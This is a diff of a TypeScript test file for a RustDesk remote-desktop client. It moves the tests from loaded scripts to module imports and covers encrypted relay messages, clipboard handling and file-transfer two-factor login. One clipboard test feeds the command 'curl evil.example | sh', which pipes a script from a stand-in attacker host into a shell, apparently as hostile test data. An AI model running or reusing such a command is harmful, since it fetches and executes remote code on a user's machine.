@@ -1,30 +1,18 @@
 /**
- * The wrapped RustDesk client (static/rdclient/client.js and
- * file-connection.js) against a fake device: messages go in through the
+ * The RustDesk client (src/lib/remote/client/client.ts and
+ * file-connection.ts) against a fake device: messages go in through the
  * relay handler, what the client sends is caught at the relay socket. No
  * rendezvous, relay or device runs.
  */
 import { beforeEach, describe, expect, test, vi } from 'vitest';
-import { loadScripts, RD_CORE, type Loaded } from './rdclient-scripts.ts';
+import nacl from 'tweetnacl';
+import { RDClient } from '../../../src/lib/remote/client/client.ts';
+import { RDClipboard } from '../../../src/lib/remote/client/clipboard.ts';
+import { RDCompress } from '../../../src/lib/remote/client/compress.ts';
+import { RDFileConnection } from '../../../src/lib/remote/client/file-connection.ts';
+import { RemoteTargetSession } from '../../../src/lib/remote/client/remote-target.ts';
 
-const g: Loaded = loadScripts(
-	[
-		...RD_CORE,
-		'video.js',
-		'audio.js',
-		'renderer.js',
-		'keyboard-scancode.js',
-		'keyboard-encoder.js',
-		'input.js',
-		'compress.js',
-		'clipboard.js',
-		'filetransfer.js',
-		'file-connection.js',
-		'client.js'
-	],
-	['RDClient', 'RDFileConnection', 'RDCrypto', 'RDClipboard', 'RDCompress', 'nacl']
-);
-const nacl = g.nacl;
+const g = { RDClient, RDFileConnection, RDClipboard, RDCompress };
 
 beforeEach(() => {
 	// jsdom has no 2D canvas; the renderer copes with a missing context
@@ -105,13 +93,13 @@ function device(proto: Proto, o: { id?: string; relaySigner?: SignKeys; idSigner
 		sealed(msg: unknown) {
 			const nonce = new Uint8Array(24);
 			nonce[0] = ++seq;
-			return nacl.secretbox(proto.serializeMessage(msg), nonce, key) as Uint8Array;
+			return nacl.secretbox(proto.serializeMessage(msg), nonce, key!) as Uint8Array;
 		},
 		/** Decrypt the client's n-th encrypted frame (the relay delivers it as it was sent) */
 		open(frame: Uint8Array, n: number) {
 			const nonce = new Uint8Array(24);
 			nonce[0] = n;
-			const plain = nacl.secretbox.open(frame, nonce, key) as Uint8Array | null;
+			const plain = nacl.secretbox.open(frame, nonce, key!) as Uint8Array | null;
 			return plain && proto.decodeMessage(plain);
 		}
 	};
@@ -367,9 +355,9 @@ describe('device clipboard', () => {
 });
 
 describe('RDP and VNC clipboard', () => {
-	const Session = loadScripts(['remote-target.js'], ['RemoteTargetSession']).RemoteTargetSession;
+	const Session = RemoteTargetSession;
 
-	function clipboardStream(s: Loaded) {
+	function clipboardStream(s: RemoteTargetSession) {
 		s._handle(['clipboard', '1', 'text/plain']);
 		s._handle(['blob', '1', btoa('curl evil.example | sh')]);
 		s._handle(['end', '1']);
@@ -408,7 +396,7 @@ describe('a second factor on the file transfer session', () => {
 		c.on('file_login_error', fileError);
 		const mainSend = vi.spyOn(c, '_sendPeerMessage');
 		await c.ensureFileConnection();
-		const fc = c._fileConnection;
+		const fc = c._fileConnection!;
 		const fileSend = vi.spyOn(fc, 'submit2FA').mockImplementation(() => {});
 
 		fc._emit('2fa_required');
